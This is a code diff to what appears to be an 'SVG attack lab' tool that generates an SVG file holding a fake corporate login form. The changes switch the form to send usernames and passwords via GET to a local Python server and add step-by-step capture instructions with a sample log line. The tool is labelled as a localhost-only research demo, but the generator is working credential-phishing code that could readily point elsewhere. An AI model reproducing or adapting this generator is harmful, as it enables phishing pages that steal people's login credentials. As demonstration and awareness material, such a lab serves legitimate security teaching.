@@ -733,7 +733,7 @@
         <span style="color:#39d98a;background:#001a0a;padding:6px 12px;border-radius:5px;display:inline-block;letter-spacing:0.5px">
           python3 -m http.server &lt;YOUR_PORT&gt;
         </span><br><br>
-        <span style="color:var(--muted)">Then enter your chosen port below. The SVG will POST form data to <code style="color:#4f8ef7">http://localhost:PORT/phish</code></span>
+        <span style="color:var(--muted)">Then enter your chosen port below. The SVG will send credentials via <strong>GET</strong> to <code style="color:#4f8ef7">http://localhost:PORT</code> — visible in your python server terminal log as <code style="color:#39d98a">GET /?username=...&password=...</code></span>
       </div>
     </div>
 
@@ -851,12 +851,12 @@
         &nbsp;&nbsp;<span style="background:var(--bg);padding:2px 8px;border-radius:4px;color:#4f8ef7">python3 -m http.server 8080</span>
         &nbsp; (or any port you like)<br><br>
         <span style="color:var(--accent)">Step 2</span> — Enter that same port number in the field above, then click <strong>Generate</strong>.<br><br>
-        <span style="color:var(--accent)">Step 3</span> — Click <strong>Download SVG</strong> and open the file in your browser.<br><br>
-        <span style="color:var(--accent)">Step 4</span> — Fill in the fake login form and hit Submit.<br><br>
-        <span style="color:var(--accent)">Step 5</span> — Watch your terminal — the POST request with credentials will appear in the server log.<br><br>
-        <span style="color:var(--muted)">Note: Browser CORS policy blocks cross-origin POST from file:// in some browsers.
-        For best results serve the SVG via your local server too: place it in the same folder and open
-        <span style="color:#4f8ef7">http://localhost:8080/phish-demo.svg</span></span>
+        <span style="color:var(--accent)">Step 3</span> — Click <strong>Download SVG</strong>, place it in the same folder your server is running from, then open:<br>
+        &nbsp;&nbsp;<span style="background:var(--bg);padding:2px 8px;border-radius:4px;color:#4f8ef7">http://localhost:8080/phish-demo-bananacorp.svg</span><br><br>
+        <span style="color:var(--accent)">Step 4</span> — Fill in any test credentials (e.g. <code style="color:#50e090">user: test@demo.com</code> / <code style="color:#50e090">pass: hunter2</code>) and click Sign In.<br><br>
+        <span style="color:var(--accent)">Step 5</span> — Watch your terminal. The credentials appear in the GET request log:<br>
+        &nbsp;&nbsp;<span style="background:var(--bg);padding:2px 8px;border-radius:4px;color:#39d98a;font-size:11px">127.0.0.1 - - "GET /?username=test%40demo.com&password=hunter2&_demo=SVGAttackLab-ResearchOnly HTTP/1.1" 200 -</span><br><br>
+        <span style="color:var(--muted)">Note: python3 -m http.server handles GET natively — no extra setup needed. Credentials appear URL-encoded in the request path shown in your terminal.</span>
       </span>
     </div>
 
@@ -946,12 +946,13 @@ const TECHNIQUES = {
 let phishSVGOutput = '';
 
 function buildPhishSVG(port) {
-  const target = `http://localhost:${port}/phish`;
+  const target = `http://localhost:${port}`;
   return `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xhtml="http://www.w3.org/1999/xhtml"
      width="600" height="520" viewBox="0 0 600 520">
 
   <!-- ██ SECURITY DEMO — NOT A REAL COMPANY — FOR AUTHORIZED RESEARCH ONLY ██ -->
-  <!-- Credentials sent to: ${target} (localhost only) -->
+  <!-- Credentials sent via GET to: ${target} (localhost only) -->
+  <!-- Visible in python -m http.server log as: GET /?username=...&password=... -->
 
   <!-- Demo watermark background -->
   <rect width="600" height="520" fill="#0d0f14"/>
@@ -984,7 +985,8 @@ function buildPhishSVG(port) {
           Sign in to your account
         </xhtml:div>
 
-        <xhtml:form method="POST" action="${target}" style="margin:0"
+        <!-- GET method — creds appear in URL query string, logged by python -m http.server -->
+        <xhtml:form method="GET" action="${target}" style="margin:0"
           onsubmit="this.querySelector('.submit-btn').textContent='Sending to localhost...';return true;">
 
           <xhtml:div style="margin-bottom:14px">
@@ -1006,7 +1008,6 @@ function buildPhishSVG(port) {
           </xhtml:div>
 
           <xhtml:input type="hidden" name="_demo" value="SVGAttackLab-ResearchOnly"/>
-          <xhtml:input type="hidden" name="_target" value="${target}"/>
 
           <xhtml:button type="submit" class="submit-btn"
             style="width:100%;padding:11px;background:#50e090;border:none;border-radius:6px;
@@ -1019,10 +1020,9 @@ function buildPhishSVG(port) {
         <!-- Demo notice inside form area too -->
         <xhtml:div style="margin-top:16px;background:#1a0808;border:1px solid #5a2020;border-radius:6px;
                           padding:10px 12px;font-size:10px;color:#e06060;font-family:monospace;line-height:1.6">
-          🔬 DEMO: Creds POST to <xhtml:strong style="color:#ff8080">localhost:${port}/phish</xhtml:strong> only.
-          Run: <xhtml:code style="background:#0d0000;padding:1px 5px;border-radius:3px">
-            python3 -m http.server ${port}
-          </xhtml:code> to capture.
+          🔬 DEMO: Creds sent via <xhtml:strong style="color:#ff8080">GET to localhost:${port}</xhtml:strong> only.
+          Run <xhtml:code style="background:#0d0000;padding:1px 5px;border-radius:3px">python3 -m http.server ${port}</xhtml:code>
+          then check terminal — log shows: <xhtml:code style="background:#0d0000;padding:1px 5px;border-radius:3px">GET /?username=...&amp;password=...</xhtml:code>
         </xhtml:div>
       </xhtml:div>
 
